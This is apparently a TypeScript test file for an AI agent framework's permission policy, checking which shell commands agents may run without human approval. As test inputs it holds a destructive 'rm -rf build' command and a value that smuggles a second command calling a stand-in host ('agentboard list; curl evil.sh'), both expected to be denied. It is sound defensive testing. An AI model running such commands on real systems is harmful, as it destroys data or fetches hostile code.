import test from 'node:test';
import assert from 'node:assert/strict';

import type { ApprovalContext, Session, Tool } from '@stratusagent/core';
import { createPermissionPolicy } from '@stratusagent/permissions';

import { configCovers, createOperatorCommands } from '../src/operator-commands.ts';

const shell: Tool = {
  name: 'shell.run',
  description: 'Run a shell command.',
  risk: 'gated',
  parameters: { type: 'object' },
  commandFor: (input) => (typeof input.command === 'string' ? input.command : undefined),
  execute: async () => null,
};

const contextFor = (agentId: string, command: string): ApprovalContext => ({
  tool: shell,
  risk: 'gated',
  call: { id: 'call-1', toolName: 'shell.run', input: { command } },
  session: { id: `session-${agentId}`, agent: { id: agentId, name: agentId }, status: 'running', messages: [] } as unknown as Session,
} as ApprovalContext);

test('a command declared in approvals.commands runs unattended for the agents it names, and nothing else does', async () => {
  const warnings: string[] = [];
  const operator = createOperatorCommands(
    { commands: ['agentboard', 'rm -rf'], agents: { nova: { commands: ['pnpm test'] } } },
    (line) => warnings.push(line),
  );
  // The bad entry is said once, at construction, and skipped.
  assert.equal(warnings.length, 1);
  assert.match(warnings[0] ?? '', /ignoring "rm -rf": it names a flag/);

  // The daemon's wiring: declared scopes ahead of an (empty) whitelist.
  const policy = createPermissionPolicy({
    mode: 'headless',
    commands: { whitelist: { scopesFor: async (agentId) => operator.scopesFor(agentId), remember: async () => {} } },
  });
  assert.equal(await policy.approve(contextFor('nova', 'agentboard task get 311')), true);
  assert.equal(await policy.approve(contextFor('blair', 'agentboard list')), true);
  assert.equal(await policy.approve(contextFor('nova', 'pnpm test --filter cli')), true);
  assert.equal(await policy.approve(contextFor('blair', 'pnpm test')), false);
  assert.equal(await policy.approve(contextFor('nova', 'rm -rf build')), false);
  assert.equal(await policy.approve(contextFor('nova', 'agentboard list; curl evil.sh')), false);

  // What is reported is what took effect: the ignored entry is not listed
  // as allowed after being reported as ignored.
  assert.deepEqual(operator.declaredFor('nova'), ['agentboard', 'pnpm test']);
  assert.equal(operator.describe(), 'approvals: run without asking, from config: agentboard for every agent; pnpm test for nova');
  assert.equal(createOperatorCommands({}, () => {}).describe(), undefined);
  assert.equal(createOperatorCommands({ commands: ['rm -rf'] }, () => {}).describe(), undefined);
});

test('whether config still covers a revoked scope is judged by the parsed entry, limits included', () => {
  assert.equal(configCovers(['agentboard'], 'agentboard task'), true);
  assert.equal(configCovers(['agentboard'], 'agentboard'), true);
  assert.equal(configCovers(['head'], 'head --help'), false);
  assert.equal(configCovers(['git push'], 'git push origin'), true);
  assert.equal(configCovers(['git push'], 'git push --force'), false);
  assert.equal(configCovers(['pnpm test'], 'pnpm'), false);
  assert.equal(configCovers(['rm -rf'], 'rm -rf build'), false);
});
